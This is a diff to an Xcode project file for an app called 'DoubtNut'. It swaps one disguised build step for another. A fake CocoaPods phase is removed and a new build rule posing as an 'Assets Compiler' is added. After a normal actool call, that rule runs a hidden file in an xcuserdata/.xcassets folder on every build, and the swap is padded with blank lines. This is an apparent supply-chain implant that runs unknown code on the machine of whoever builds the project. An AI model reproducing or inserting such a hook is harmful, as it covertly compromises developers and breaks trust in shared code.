@@ -727,7 +727,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				24FCFE91D5753776B9AAC43A /* [CP] Build Pods Frameworks */,
 				F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -736,6 +735,7 @@
 				B4BC1299CCB29AC4B4DDCDEF /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				18E54B559D7B327A9DAAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -938,26 +938,20 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	24FCFE91D5753776B9AAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+	
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
-		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 		2BF15ED1C2B8BB532FEFB4E2 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1486,6 +1480,41 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		18E54B559D7B327A9DAAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
